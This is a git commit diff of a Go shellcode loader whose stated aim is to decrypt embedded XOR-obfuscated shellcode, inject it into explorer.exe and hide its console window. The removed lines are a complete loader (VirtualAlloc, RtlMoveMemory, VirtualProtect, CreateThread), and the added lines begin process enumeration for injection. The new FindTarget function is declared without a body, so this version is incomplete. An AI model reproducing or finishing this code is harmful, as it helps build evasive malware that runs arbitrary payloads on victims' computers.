7a05c837ff6f49d6ac1656841ac81a6ec1c2c56a
0xBruno@Win10 <0xBruno@pwn.you>
2022-09-10 20:21:48 -0500

    Refactoring for code injection

--- main.go
+++ main.go
@@ -10,8 +10,13 @@ import (
 
 var (
 	kernel32DLL   = windows.NewLazySystemDLL("kernel32.dll")
-	RtlMoveMemory = kernel32DLL.NewProc("RtlMoveMemory")
-	CreateThread  = kernel32DLL.NewProc("CreateThread")
+	
+	lstrcmpiA = kernel32DLL.NewProc("lstrcmpiA")
+	CloseHandle = kernel32DLL.NewProc("CloseHandle")
+	Process32Next  = kernel32DLL.NewProc("Process32Next")
+	Process32First  = kernel32DLL.NewProc("Process32First")
+	CreateToolhelp32Snapshot = kernel32DLL.NewProc("CreateToolhelp32Snapshot")
+
 )
 
 //go:embed sc.xor.42.b64
@@ -20,9 +25,9 @@ var (
 var enc_sc_b64 string 
 
 // https://kylewbanks.com/blog/xor-encryption-using-go
-// EncryptDecrypt runs a XOR encryption on the input string, encrypting it if it hasn't already been,
+// xor runs a XOR encryption on the input string, encrypting it if it hasn't already been,
 // and decrypting it if it has, using the key provided.
-func EncryptDecrypt(input, key string) (output []byte) {
+func xor(input, key string) (output []byte) {
 	for i := 0; i < len(input); i++ {
 			output = append(output, input[i] ^ key[i % len(key)])
 	}
@@ -30,48 +35,27 @@ func EncryptDecrypt(input, key string) (output []byte) {
 	return output
 }
 
+func decrypt_xor_shellcode(key string, encrypted_sc_b64 string)(output []byte){ 
+	//Decode from b64 string
+	enc_sc, _ := b64.StdEncoding.DecodeString(encrypted_sc_b64)
+	//XOR with key
+	output = xor(string(enc_sc), key)
+	
+	return output
+	 
+}
+
+func FindTarget()
 func main() {
 	// objectives:
 	// embed encrypted shellcode from file into program
 	// decrypt shellcode (XOR)
 	// inject shellcode into explorer.exe
 	// get rid of console window (pop up)
-
 	key := "42"
-	enc_sc, _ := b64.StdEncoding.DecodeString(enc_sc_b64)
-	sc := EncryptDecrypt(string(enc_sc), key)
+	sc := decrypt_xor_shellcode(key, enc_sc_b64)
+	
 
-	// Allocate a memory buffer for the payload
-	addr, err := windows.VirtualAlloc(
-		uintptr(0),
-		uintptr(len(sc)),
-		windows.MEM_COMMIT|windows.MEM_RESERVE,
-		windows.PAGE_READWRITE)
-
-	if err != nil {
-		panic(fmt.Sprintf("[!] VirtualAlloc(): %s", err.Error()))
-	}
-
-	// Copy payload to the new buffer
-	RtlMoveMemory.Call(addr, (uintptr)(unsafe.Pointer(&sc[0])), (uintptr)(len(sc)))
-
-	var oldProtect uint32
-
-	//Make the new buffer executable
-	err = windows.VirtualProtect(addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)
-
-	if err != nil {
-		panic(fmt.Sprintf("[!] VirtualProtect(): %s", err))
-	}
-
-	// Send it
-	thread, _, err := CreateThread.Call(0, 0, addr, uintptr(0), 0, 0)
-
-	if err.Error() != "The operation completed successfully." {
-		panic(fmt.Sprintf("[!] CreateThread(): %s", err.Error()))
-	}
-
-	// Wait forever
-	windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
+	
 
 }
